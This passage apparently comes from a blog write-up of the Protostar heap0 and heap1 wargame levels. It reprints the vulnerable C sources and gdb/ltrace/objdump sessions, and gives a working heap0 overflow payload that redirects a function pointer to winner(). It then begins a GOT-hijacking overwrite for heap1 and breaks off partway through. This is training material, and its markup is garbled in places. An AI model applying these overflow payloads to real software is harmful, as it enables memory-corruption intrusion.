-</span><span class='line'>  <span class="k">struct</span> <span class="n">fp</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">f</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">d</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">data</span><span class="p">));</span>
-</span><span class='line'>  <span class="n">f</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">fp</span><span class="p">));</span>
-</span><span class='line'>  <span class="n">f</span><span class="o">-&gt;</span><span class="n">fp</span> <span class="o">=</span> <span class="n">nowinner</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">data</span> <span class="n">is</span> <span class="n">at</span> <span class="o">%</span><span class="n">p</span><span class="p">,</span> <span class="n">fp</span> <span class="n">is</span> <span class="n">at</span> <span class="o">%</span><span class="n">p</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">d</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">strcpy</span><span class="p">(</span><span class="n">d</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="p">();</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ gdb -q /opt/protostar/bin/heap0
-</span><span class='line'>Really redefine built-in command &ldquo;frame&rdquo;? (y or n) [answered Y; input not from terminal]
-</span><span class='line'>Really redefine built-in command &ldquo;thread&rdquo;? (y or n) [answered Y; input not from terminal]
-</span><span class='line'>Really redefine built-in command &ldquo;start&rdquo;? (y or n) [answered Y; input not from terminal]
-</span><span class='line'>Reading symbols from /opt/protostar/bin/heap0&hellip;done.&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>gdb> r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
-</span><span class='line'>data is at 0x804a008, fp is at 0x804a050&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>Program received signal SIGSEGV, Segmentation fault.&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;hr />
-</span><span class='line'>
-</span><span class='line'>&lt;pre>&lt;code> eax:41346341 ebx:B7FD7FF4  ecx:00000000  edx:00000065     eflags:00210246
-</span><span class='line'> esi:00000000 edi:00000000  esp:BFFFF70C  ebp:BFFFF738     eip:41346341
-</span><span class='line'> cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s Z a P c 
-</span><span class='line'>&lt;/code>&lt;/pre>
-</span><span class='line'>
-</span><span class='line'>&lt;p>[007B:BFFFF70C]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[stack]
-</span><span class='line'>BFFFF73C : 76 DC EA B7  02 00 00 00 - E4 F7 FF BF  F0 F7 FF BF v&hellip;&hellip;&hellip;&hellip;&hellip;
-</span><span class='line'>BFFFF72C : 50 A0 04 08  20 85 04 08 - 00 00 00 00  B8 F7 FF BF P&hellip; &hellip;&hellip;&hellip;..
-</span><span class='line'>BFFFF71C : 38 F7 FF BF  65 63 EC B7 - 40 10 FF B7  08 A0 04 08 8&hellip;ec..@&hellip;&hellip;.
-</span><span class='line'>BFFFF70C : FF 84 04 08  08 A0 04 08 - 1D F9 FF BF  50 A0 04 08 &hellip;&hellip;&hellip;&hellip;P&hellip;
-</span><span class='line'>[007B:41346341]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ data]
-</span><span class='line'>41346341 : Error while running hook_stop:
-</span><span class='line'>Cannot access memory at address 0x41346341
-</span><span class='line'>0x41346341 in ?? ()</span></code></pre></td></tr></table></div></figure></p>
-
-<p><code>0x41346341</code> represents the offset 72, also <code>0x804a050 - 0x804a008 = 72</code>. So we
-write 64B to <code>d-&gt;name</code> and after another 8B, there is the address of <code>fp</code>.</p>
-
-<p>To verify our statement, we use ltrace and gdb:</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace /opt/protostar/bin/heap0 1337
-</span><span class='line'>__libc_start_main(0x804848c, 2, 0xbffff844, 0x8048520, 0x8048510 &lt;unfinished ...>
-</span><span class='line'>malloc(64)                                                      = 0x0804a008
-</span><span class='line'>malloc(4)                                                       = 0x0804a050
-</span><span class='line'>printf(&ldquo;data is at %p, fp is at %p\n&rdquo;, 0x804a008, 0x804a050data is at 0x804a008, f
-</span><span class='line'>)                                                                  = 41
-</span><span class='line'>strcpy(0x0804a008, &ldquo;1337&rdquo;)                                      = 0x0804a008
-</span><span class='line'>puts(&ldquo;level has not been passed"level has not been passed
-</span><span class='line'>)    = 26
-</span><span class='line'>+++ exited (status 26) +++</span></code></pre></td></tr></table></div></figure></p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ gdb -q /opt/protostar/bin/heap0
-</span><span class='line'>Really redefine built-in command &ldquo;frame&rdquo;? (y or n) [answered Y; input not from terminal]
-</span><span class='line'>Really redefine built-in command &ldquo;thread&rdquo;? (y or n) [answered Y; input not from terminal]
-</span><span class='line'>Really redefine built-in command &ldquo;start&rdquo;? (y or n) [answered Y; input not from terminal]
-</span><span class='line'>Reading symbols from /opt/protostar/bin/heap0&hellip;done.&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>gdb> b *0x80484ff
-</span><span class='line'>Breakpoint 1 at 0x80484ff: file heap0/heap0.c, line 40.&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>gdb> r $(ruby -e &lsquo;print &ldquo;X&rdquo; * 64&rsquo;)
-</span><span class='line'>data is at 0x804a008, fp is at 0x804a050
-</span><span class='line'>level has not been passed&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;hr />
-</span><span class='line'>
-</span><span class='line'>&lt;pre>&lt;code> eax:0000001A ebx:B7FD7FF4  ecx:B7FD84C0  edx:B7FD9340     eflags:00200246
-</span><span class='line'> esi:00000000 edi:00000000  esp:BFFFF730  ebp:BFFFF758     eip:080484FF
-</span><span class='line'> cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s Z a P c 
-</span><span class='line'>&lt;/code>&lt;/pre>
-</span><span class='line'>
-</span><span class='line'>&lt;p>[007B:BFFFF730]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[stack]
-</span><span class='line'>BFFFF760 : 02 00 00 00  04 F8 FF BF - 10 F8 FF BF  48 18 FE B7 &hellip;&hellip;&hellip;&hellip;H&hellip;
-</span><span class='line'>BFFFF750 : 20 85 04 08  00 00 00 00 - D8 F7 FF BF  76 DC EA B7  &hellip;&hellip;&hellip;..v&hellip;
-</span><span class='line'>BFFFF740 : 65 63 EC B7  40 10 FF B7 - 08 A0 04 08  50 A0 04 08 ec..@&hellip;&hellip;.P&hellip;
-</span><span class='line'>BFFFF730 : 08 A0 04 08  41 F9 FF BF - 50 A0 04 08  58 F7 FF BF &hellip;.A&hellip;P&hellip;X&hellip;
-</span><span class='line'>[007B:BFFFF730]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ data]
-</span><span class='line'>BFFFF730 : 08 A0 04 08  41 F9 FF BF - 50 A0 04 08  58 F7 FF BF &hellip;.A&hellip;P&hellip;X&hellip;
-</span><span class='line'>BFFFF740 : 65 63 EC B7  40 10 FF B7 - 08 A0 04 08  50 A0 04 08 ec..@&hellip;&hellip;.P&hellip;
-</span><span class='line'>[0073:080484FF]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ code]
-</span><span class='line'>0x80484ff &lt;main+115>:   leave&lt;br/>
-</span><span class='line'>0x8048500 &lt;main+116>:   ret  &lt;br/>
-</span><span class='line'>0x8048501:  nop
-</span><span class='line'>0x8048502:  nop
-</span><span class='line'>0x8048503:  nop&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;h2>0x8048504:  nop&lt;/h2>
-</span><span class='line'>
-</span><span class='line'>&lt;p>Breakpoint 1, main (argc=0x2, argv=0xbffff804) at heap0/heap0.c:40
-</span><span class='line'>40  heap0/heap0.c: No such file or directory.
-</span><span class='line'>    in heap0/heap0.c&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>gdb> x /25x 0x0804a000
-</span><span class='line'>0x804a000:  0x00000000  0x00000049  0x58585858  0x58585858
-</span><span class='line'>0x804a010:  0x58585858  0x58585858  0x58585858  0x58585858
-</span><span class='line'>0x804a020:  0x58585858  0x58585858  0x58585858  0x58585858
-</span><span class='line'>0x804a030:  0x58585858  0x58585858  0x58585858  0x58585858
-</span><span class='line'>0x804a040:  0x58585858  0x58585858  0x00000000  0x00000011
-</span><span class='line'>0x804a050:  0x08048478  0x00000000  0x00000000  0x00020fa9
-</span><span class='line'>0x804a060:  0x00000000</span></code></pre></td></tr></table></div></figure></p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(08) 0x0804a000: d-control
-</span><span class='line'>(64) 0x0804a008: d-name&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>(08) 0x0804a048: f-control
-</span><span class='line'>(04) 0x0804a050: f-fp</span></code></pre></td></tr></table></div></figure></p>
-
-<p>We set <code>fp</code> to <code>winner()</code> symbol:</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ nm /opt/protostar/bin/heap0 | grep winner
-</span><span class='line'>08048478 T nowinner
-</span><span class='line'>08048464 T winner&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>user@protostar:~$ /opt/protostar/bin/heap0 $(ruby -e &lsquo;print &ldquo;X&rdquo;*72 + [0x08048464].pack(&ldquo;V&rdquo;)&rsquo;)
-</span><span class='line'>data is at 0x804a008, fp is at 0x804a050
-</span><span class='line'>level passed</span></code></pre></td></tr></table></div></figure></p>
-
-<h2>Protostar Heap1</h2>
-
-<p><figure class='code'><figcaption><span>heap1.c </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">struct</span> <span class="n">internet</span> <span class="p">{</span>
-</span><span class='line'>  <span class="kt">int</span> <span class="n">priority</span><span class="p">;</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
-</span><span class='line'><span class="p">};</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">winner</span><span class="p">()</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">and</span> <span class="n">we</span> <span class="n">have</span> <span class="n">a</span> <span class="n">winner</span> <span class="err">@</span> <span class="o">%</span><span class="n">d</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
-</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="k">struct</span> <span class="n">internet</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">i1</span><span class="p">,</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">i2</span><span class="p">,</span> <span class="o">*</span><span class="n">i3</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">i1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">internet</span><span class="p">));</span>
-</span><span class='line'>  <span class="n">i1</span><span class="o">-&gt;</span><span class="n">priority</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-</span><span class='line'>  <span class="n">i1</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">i2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">internet</span><span class="p">));</span>
-</span><span class='line'>  <span class="n">i2</span><span class="o">-&gt;</span><span class="n">priority</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
-</span><span class='line'>  <span class="n">i2</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">strcpy</span><span class="p">(</span><span class="n">i1</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">i2</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">and</span> <span class="n">that</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">s</span> <span class="n">a</span> <span class="n">wrap</span> <span class="n">folks</span><span class="o">!</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
-</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace /opt/protostar/bin/heap1 AAAA BBBB
-</span><span class='line'>__libc_start_main(0x80484b9, 3, 0xbffff834, 0x8048580, 0x8048570 &lt;unfinished ...>
-</span><span class='line'>malloc(8)                        = 0x0804a008
-</span><span class='line'>malloc(8)                        = 0x0804a018
-</span><span class='line'>malloc(8)                        = 0x0804a028
-</span><span class='line'>malloc(8)                        = 0x0804a038
-</span><span class='line'>strcpy(0x0804a018, &ldquo;AAAA&rdquo;)       = 0x0804a018
-</span><span class='line'>strcpy(0x0804a038, &ldquo;BBBB&rdquo;)       = 0x0804a038
-</span><span class='line'>puts(&ldquo;and that&rsquo;s a wrap folks!"and that&rsquo;s a wrap folks!
-</span><span class='line'>)                   = 25
-</span><span class='line'>+++ exited (status 25) +++</span></code></pre></td></tr></table></div></figure></p>
-
-<p>We have four allocated chunks in memory:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(8) 0x0804a000: i1-control
-</span><span class='line'>(4) 0x0804a008: i1-priority
-</span><span class='line'>(4) 0x0804a00c: i1-name(addr)&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>(8) 0x0804a010: i1-name-control
-</span><span class='line'>(8) 0x0804a018: i1-name&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>(8) 0x0804a020: i2-control
-</span><span class='line'>(4) 0x0804a028: i2-priority
-</span><span class='line'>(4) 0x0804a02c: i2-name(addr)&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>(8) 0x0804a030: i2-name-control
-</span><span class='line'>(8) 0x0804a038: i2-name</span></code></pre></td></tr></table></div></figure></p>
-
-<p>After 20 bytes, we are able to change <code>i2-name(addr)</code>, that is used by second <code>strcpy()</code>.</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace -e strcpy /opt/protostar/bin/heap1 $(ruby -e &lsquo;print &ldquo;A&rdquo; * 20 + [0x44444444].pack(&ldquo;V&rdquo;) &rsquo;) 2222
-</span><span class='line'>strcpy(0x0804a018, &ldquo;AAAAAAAAAAAAAAAAAAAADDDD&rdquo;)      = 0x0804a018
-</span><span class='line'>strcpy(0x44444444, &ldquo;2222&rdquo; &lt;unfinished ...>
-</span><span class='line'>&mdash; SIGSEGV (Segmentation fault) &mdash;
-</span><span class='line'>+++ killed by SIGSEGV +++</span></code></pre></td></tr></table></div></figure></p>
-
-<p>We use <code>Global Offset Table Hijacking</code> technique:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ objdump -TR /opt/protostar/bin/heap1&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>/opt/protostar/bin/heap1:     file format elf32-i386&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>DYNAMIC SYMBOL TABLE:
-</span><span class='line'>00000000  w   D  &lt;em>UND&lt;/em>  00000000              &lt;strong>gmon_start&lt;/strong>
-</span><span class='line'>00000000      DF &lt;em>UND&lt;/em>  00000000  GLIBC_2.0   &lt;em>_libc_start_main
-</span><span class='line'>00000000      DF &lt;em>UND&lt;/em>  00000000  GLIBC_2.0   strcpy
-</span><span class='line'>00000000      DF &lt;em>UND&lt;/em>  00000000  GLIBC_2.0   printf
-</span><span class='line'>00000000      DF &lt;em>UND&lt;/em>  00000000  GLIBC_2.0   time
-</span><span class='line'>00000000      DF &lt;em>UND&lt;/em>  00000000  GLIBC_2.0   malloc
-</span><span class='line'>00000000      DF &lt;em>UND&lt;/em>  00000000  GLIBC_2.0   puts
-</span><span class='line'>0804862c g    DO .rodata    00000004  Base        &lt;/em>IO_stdin_used&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>DYNAMIC RELOCATION RECORDS
-</span><span class='line'>OFFSET   TYPE              VALUE
-</span><span class='line'>0804974c R_386_GLOB_DAT    &lt;strong>gmon_start&lt;/strong>
-</span><span class='line'>0804975c R_386_JUMP_SLOT   &lt;strong>gmon_start&lt;/strong>
-</span><span class='line'>08049760 R_386_JUMP_SLOT   __libc_start_main
-</span><span class='line'>08049764 R_386_JUMP_SLOT   strcpy
-</span><span class='line'>08049768 R_386_JUMP_SLOT   printf
-</span><span class='line'>0804976c R_386_JUMP_SLOT   time
-</span><span class='line'>08049770 R_386_JUMP_SLOT   malloc
-</span><span class='line'>08049774 R_386_JUMP_SLOT   puts&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>user@protostar:~$ nm /opt/protostar/bin/heap1 | grep winner
